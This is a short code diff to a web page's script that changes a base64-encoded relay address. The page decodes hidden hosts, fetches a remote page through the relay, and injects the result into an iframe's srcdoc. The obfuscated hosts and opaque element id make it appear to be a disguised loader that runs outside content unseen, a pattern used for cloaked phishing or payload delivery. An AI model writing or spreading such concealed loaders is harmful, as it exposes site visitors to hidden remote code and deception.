@@ -36,15 +36,11 @@ html, body {
   function decodeBase64(str) {
     return decodeURIComponent(escape(atob(str)));
   }
-
-  const encodedRelay = "aHR0cHM6Ly9sb2dpc3RpY2FsLXV0aWxpdGllcy52ZXJjZWwuYXBw";
+  const encodedRelay = "aHR0cHM6Ly9uZXR3b3JrLTk4Lm5ldHdvcmstbG9naWMuZGVuby5uZXQ=";
   const encodedTarget = "aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==";
-
   const relayBase = decodeBase64(encodedRelay);
   const targetOrigin = decodeBase64(encodedTarget);
-
   const proxyUrl = relayBase + "/api/relay?url=" + encodeURIComponent(targetOrigin);
-
   fetch(proxyUrl)
     .then(function(response) {
       if (!response.ok) throw new Error("fetch failed");
@@ -61,7 +57,6 @@ html, body {
       } else {
         processed = baseTag + '\n' + processed;
       }
-
       document.getElementById("x1").srcdoc = processed;
     })
     .catch(function(err) {
